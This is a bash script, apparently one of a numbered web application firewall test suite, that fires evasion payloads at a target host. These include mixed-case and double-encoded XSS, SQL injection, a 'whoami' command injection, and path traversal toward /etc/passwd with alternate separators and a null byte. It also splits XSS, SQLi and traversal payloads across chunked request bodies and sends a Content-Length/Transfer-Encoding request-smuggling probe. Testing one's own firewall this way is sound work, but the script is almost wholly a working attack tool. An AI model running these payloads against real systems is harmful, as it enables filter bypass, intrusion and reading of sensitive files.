#!/bin/bash
# Case manipulation and chunked transfer encoding evasion
# Tests WAF case-insensitive matching and chunked body reassembly
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 06-case-chunked-evasion.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Case Manipulation & Chunked Evasion against ${TARGET}"
echo ""

echo "[+] Case manipulation combined with URL encoding"
CASE_PAYLOADS=(
  "case-xss-mixed|%3CsCrIpT%3Ealert(1)%3C/ScRiPt%3E"
  "case-sqli-mixed|SeLeCt%20%2a%20FrOm%20users"
  "case-union-mixed|UnIoN%20SeLeCt%20NuLl,NuLl--"
  "case-double-enc|%253CScRiPt%253Ealert(1)%253C%252FsCrIpT%253E"
  "case-cmd-inject|%3B%20WhoAmI"
  "case-xss-event|%3CiMg%20SrC%3Dx%20OnErRoR%3Dalert(1)%3E"
  "case-sqli-or|'%20oR%20'1'%3D'1"
  "case-traversal|..%5C..%5C..%5Cetc%5Cpasswd"
)

for entry in "${CASE_PAYLOADS[@]}"; do
  name="${entry%%|*}"
  payload="${entry#*|}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?q=${payload}" --max-time 10) || code="ERR"
  printf "    %-30s %-45s -> HTTP %s\n" "${name}" "${payload}" "${code}"
done
echo ""

echo "[+] Chunked transfer encoding (split payloads across chunks)"

echo "  SQLi split across chunks..."
code=$(printf 'b\r\nq=union sel\r\n4\r\nect \r\n0\r\n\r\n' |
  curl -sk -o /dev/null -w "%{http_code}" \
    -X POST -H "Transfer-Encoding: chunked" \
    --data-binary @- "${BASE}/" --max-time 10) || code="ERR"
printf "    chunked-sqli-split                        -> HTTP %s\n" "${code}"

echo "  XSS split across chunks..."
code=$(printf '9\r\nq=<script\r\na\r\n>alert(1)\r\n0\r\n\r\n' |
  curl -sk -o /dev/null -w "%{http_code}" \
    -X POST -H "Transfer-Encoding: chunked" \
    --data-binary @- "${BASE}/" --max-time 10) || code="ERR"
printf "    chunked-xss-split                         -> HTTP %s\n" "${code}"

echo "  Path traversal split across chunks..."
code=$(printf 'a\r\nfile=../../\r\ne\r\netc/passwd\x00\r\n0\r\n\r\n' |
  curl -sk -o /dev/null -w "%{http_code}" \
    -X POST -H "Transfer-Encoding: chunked" \
    --data-binary @- "${BASE}/" --max-time 10) || code="ERR"
printf "    chunked-traversal-split                   -> HTTP %s\n" "${code}"

echo "  Content-Length + Transfer-Encoding conflict (smuggling probe)..."
code=$(curl -sk -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX' \
  "${BASE}/" --max-time 10) || code="ERR"
printf "    cl-te-conflict                            -> HTTP %s\n" "${code}"
echo ""

echo "[+] Backslash and alternate path separators"
SEPARATOR_PAYLOADS=(
  "..%5c..%5c..%5cetc%5cpasswd"
  "..%5C..%5C..%5Cetc%5Cpasswd"
  "....//....//etc/passwd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "..%c0%af..%c0%afetc%c0%afpasswd"
)

for payload in "${SEPARATOR_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}/?file=${payload}" --max-time 10) || code="ERR"
  printf "    %-50s -> HTTP %s\n" "${payload}" "${code}"
done
echo ""

echo "[*] Case manipulation & chunked evasion complete"
